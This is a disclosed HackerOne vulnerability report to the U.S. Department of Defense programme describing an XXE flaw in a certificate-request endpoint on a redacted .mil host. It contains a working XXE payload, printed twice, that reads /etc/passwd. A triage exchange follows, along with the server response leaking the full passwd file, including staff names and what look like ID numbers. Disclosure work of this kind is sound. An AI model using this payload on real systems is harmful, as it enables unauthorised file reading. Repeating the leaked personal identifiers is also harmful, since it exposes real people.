---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/xml-external-entities-xxe
  - env/web
  - vuln/ssrf
  - vuln/code-injection
  - vuln/xxe
  - vuln/dos
  - impact/rce
substate: "resolved"
weakness: "XML External Entities (XXE)"
enriched: true
body: true
date: 2024-07-19
submitted: 2024-06-25T02:10:18.267Z
bounty_usd: null
votes: 21
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "maskedpersian"
source: "https://hackerone.com/reports/2573567"
title: "XML External Entity (XXE) Injection"
---
# XML External Entity (XXE) Injection

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 21 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2024-07-19

- Report: [https://hackerone.com/reports/2573567](https://hackerone.com/reports/2573567)
- CWE: XML External Entities (XXE)
- Submitted: 2024-06-25T02:10:18.267Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

XML External Entity (XXE) injection vulnerability. XXE vulnerabilities occur when an application parses XML input that contains a reference to an external entity. When the XML parser is improperly configured to process external entities, it can allow an attacker to:
Read arbitrary files on the server.
Perform server-side request forgery (SSRF).
Conduct denial-of-service (DoS) attacks.
Execute remote code (in rare cases).
Host name: 	███████.mil

POC:
```
POST /ca/rest/certrequests HTTP/1.1
Host: ████████
Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: frame
Referer: https://███████/ca/ee/ca/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Priority: u=0, i
Connection: close
Content-Type: application/xml
Content-Length: 194

<!--?xml version="2.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<CertEnrollmentRequest>
  <Attributes/>
  <ProfileID>&ent;</ProfileID>
</CertEnrollmentRequest>
```

## Impact

Exploitation of this vulnerability can lead to:
1-Confidentiality Breach: Unauthorized access to sensitive information stored on the server.
2-Integrity Violation: Potential manipulation or corruption of application data.
3-Availability Disruption: Possible denial-of-service conditions due to resource exhaustion or application crashes.
4-Remote Code Execution: In extreme cases, execution of arbitrary commands on the server.

## System Host(s)
█████████.mil

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
```
POST /ca/rest/certrequests HTTP/1.1
Host: ██████
Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: frame
Referer: https://██████████/ca/ee/ca/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Priority: u=0, i
Connection: close
Content-Type: application/xml
Content-Length: 194

<!--?xml version="2.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<CertEnrollmentRequest>
  <Attributes/>
  <ProfileID>&ent;</ProfileID>
</CertEnrollmentRequest>
```

## Suggested Mitigation/Remediation Actions

## Timeline

- **Report Filed**
- **2024-06-25** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **2024-06-25** @maskedpersian: Could you please provide the reasoning behind changing the severity of CVE-2022-2414 to Medium?
- **2024-06-25** @agent-p1: Greetings, 

In order to process this issue we had to add a severity. Secondly, we already provided a severity based on your other report similar to this one. Lastly, you have not proven remote code execution as your POC is hypothetical at this time, nor do we take DOS in this program. 

Regards,
The VDP Team
- **2024-06-26** @maskedpersian: I was able to read the etc/passwd file and I mentioned this in the previous report , If possible, please change the sensitivity to high
```
HTTP/1.1 400 Bad Request
Date: Thu, 20 Jun 2024 01:25:28 GMT
Server: Apache
Content-Type: application/xml
Content-Length: 4920
Connection: close

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><PKIException><Attributes/><ClassName>com.netscape.certsrv.base.BadRequestException</ClassName><Code>400</Code><Message>Profile root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nnobody:x:99:99:Nobody:/:/sbin/nologin\navahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\nabrt:x:173:173::/etc/abrt:/sbin/nologin\npolkitd:x:999:998:User for polkitd:/:/sbin/nologin\nunbound:x:998:997:Unbound DNS resolver:/etc/unbound:/sbin/nologin\nlibstoragemgmt:x:997:996:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin\ntss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin\nntp:x:38:38::/etc/ntp:/sbin/nologin\npostfix:x:89:89::/var/spool/postfix:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\nchrony:x:996:995::/var/lib/chrony:/sbin/nologin\nsystemd-bus-proxy:x:995:993:systemd Bus Proxy:/:/sbin/nologin\nsystemd-network:x:994:992:systemd Network Management:/:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\npuppet:x:52:52:Puppet:/var/lib/puppet:/sbin/nologin\nnagios:x:1000:1000::/home/nagios:/bin/bash\ndthompson:x:1001:1001::/home/dthompson:/sbin/nologin\nkwheeler:x:1002:1002::/home/kwheeler:/sbin/nologin\nscorlett:x:1003:1003::/home/scorlett:/sbin/nologin\nimendeleyev:x:1004:1004::/home/imendeleyev:/sbin/nologin\nrmasengale:x:1005:1005::/home/rmasengale:/sbin/nologin\nbbaker:x:1006:1006::/home/bbaker:/sbin/nologin\nsssd:x:993:990:User for sssd:/:/sbin/nologin\njpizzullo:x:1007:1007:PIZZULLO.JOSEPH.T.1264435060:/home/jpizzullo:/bin/bash\nkcortes:x:1008:1008::/home/kcortes:/sbin/nologin\nwstark:x:1009:1009::/home/wstark:/sbin/nologin\newinters:x:1010:1010::/home/ewinters:/sbin/nologin\nmmclain:x:1011:1011::/home/mmclain:/sbin/nologin\njparrish:x:1012:1012::/home/jparrish:/sbin/nologin\nwf61695d:x:1013:1013:ACAS Scanner:/home/wf61695d:/bin/bash\ndsanchez:x:1014:1014:SANCHEZ.DIANA.L.1040930155:/home/dsanchez:/bin/bash\nnfast:x:992:989:nfast driver service account:/opt/nfast:/bin/bash\napache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin\nhsqldb:x:96:96::/var/lib/hsqldb:/sbin/nologin\ntomcat:x:91:91:Apache Tomcat:/usr/share/tomcat:/bin/nologin\npkiuser:x:17:17:Certificate System:/usr/share/pki:/sbin/nologin\ndwilliams:x:1023:1023::/home/dwilliams:/sbin/nologin\nrprice:x:1024:1024::/home/rprice:/sbin/nologin\npkiuser-sw-ca-54:x:1025:17:PKI user account for instance sw-ca-54:/home/pkiuser-sw-ca-54:/sbin/nologin\npkiuser-sw-ca-56:x:1026:17:PKI user account for instance sw-ca-56:/home/pkiuser-sw-ca-56:/sbin/nologin\npkiuser-sw-ca-58:x:1027:17:PKI user account for instance sw-ca-58:/home/pkiuser-sw-ca-58:/sbin/nologin\nbalexander:x:1028:1028:ALEXANDER.BRYAN.DOUGLAS.1165971600:/home/balexander:/bin/bash\npperez:x:1029:1029::/home/pperez:/sbin/nologin\nrposey:x:1030:1030::/home/rposey:/sbin/nologin\nbmilloy:x:1031:1031::/home/bmilloy:/sbin/nologin\nrlamotte:x:1032:1032::/home/rlamotte:/sbin/nologin\ngdunn:x:1033:1033::/home/gdunn:/sbin/nologin\nramill:x:1034:1034::/home/ramill:/sbin/nologin\nxtech:x:1035:1035::/home/xtech:/bin/bash\ninsights:x:991:986:Red Hat Insights:/var/lib/insights:/sbin/nologin\nafederico:x:1036:1036::/home/afederico:/sbin/nologin\nbnetto:x:1037:1037::/home/bnetto:/sbin/nologin\nmposey:x:1038:1038::/home/mposey:/sbin/nologin\npkiuser-email-ca-59:x:1039:17:'Certificate System':/usr/share/pki:/sbin/nologin\npkiuser-id-ca-59:x:1040:17:'Certificate System':/usr/share/pki:/sbin/nologin\npkiuser-sw-ca-61:x:1041:17:'Certificate System':/usr/share/pki:/sbin/nologin\npkiuser-sw-ca-60:x:1042:17:'Certificate System':/usr/share/pki:/sbin/nologin\naes:x:1043:1043:Account used to host DTM OCSP certificates:/home/aes:/bin/bash\nredhat:x:1044:1044:Account used to run AES webserver:/home/redhat:/bin/bash\nmagency:x:1045:1045:Service Account:/home/magency:/bin/bash\nkhales:x:1046:1046::/home/khales:/sbin/nologin\njdooley:x:1047:1047::/home/jdooley:/sbin/nologin\nrmorse:x:1048:1048::/home/rmorse:/sbin/nologin\njcoughlin:x:1049:1049::/home/jcoughlin:/sbin/nologin\ntmullin:x:1050:1050:MULLIN.TIMOTHY.HUGH.1180218110:/home/tmullin:/bin/bash\npcaballes:x:1051:1051::/home/pcaballes:/sbin/nologin\nbnovack:x:1052:1052:NOVACK.BARRY.FRANCISE.1027795079:/home/bnovack:/bin/bash\njpowell:x:1053:1053:POWELL.JAY.A.1162634875:/home/jpowell:/bin/bash\nadownum:x:1054:1054:DOWNUM.ALEXANDER.JEFFERY.1257465523:/home/adownum:/bin/bash\nncsnmpd:x:1055:1055:nCipher crypto management:/opt/nfast:/bin/bash\njsubia:x:1056:1056:SUBIA.JOSE.A.1264627598:/home/jsubia:/bin/bash\nCMacct2:x:1057:12345::/home/CMacct2:/bin/false\n Not Found</Message></PKIException>
```
- **Report Severity Updated**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
